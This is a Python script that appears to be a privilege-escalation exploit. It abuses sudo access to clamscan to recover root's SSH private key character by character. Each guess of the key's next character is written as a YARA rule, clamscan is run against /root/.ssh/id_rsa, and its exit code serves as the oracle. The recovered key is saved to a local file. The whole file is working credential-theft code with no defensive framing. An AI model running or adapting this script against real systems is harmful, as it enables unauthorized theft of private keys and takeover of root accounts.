from string import whitespace
import os, sys

# GLOBALS
# CONSTANTS##########################
w = '-----'    # The starting characters of RSA file
user = 'root'
yara_filename = 'test.yara'
#####################################
# Base64 encoding table
# List based on https://www.rfc-editor.org/rfc/rfc4648.txt
base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-_"

# All possible characters in an RSA private key file
chars = base64_chars + whitespace
#####################################

def guess_char(word):
    try:
        for c in chars:
            # Update our pattern with already discovered text
            if c == '\n':
                c = '\\n'
            yara = """'rule AsciiExample {strings: $s = """+ str('"'+word + c +'"') +""" condition: $s at 0}'"""
            # Save our pattern in a new .yara file
            writefile(yara_filename, yara)
            # Launch our ClamAV
            exit_code=os.system(f"sudo /usr/bin/clamscan /{user}/.ssh/id_rsa --database={yara_filename} --copy=/tmp/unexistingfile")
            # Check status code looking for 'c!=0' as a good character
            if exit_code !=0:
                word = word + c
                # Update the output file on every character found
                writefile('id_rsa', word.replace('\\n', '\n'))
                return word
    except Exception as e:
        writefile('error_log', e)
    print('Finished')
    sys.exit(0)

def writefile(fname, data):
    try:
        with open(fname, 'w', encoding='utf-8') as file:
            file.write(str(data))
            file.close()
    except Exception as e:
        print(e)
        sys.exit(1)

def main():
    print('Start Bruteforce')

    # Fix the user's home dir path
    global user
    if user != 'root':
        user = 'home/' + user

    # Loop over the file + char until the RSA end pattern is in there
    global w
    while True:
        w = guess_char(w)

    # Store our RSA at the end of the program
    writefile('id_rsa', w)

main()
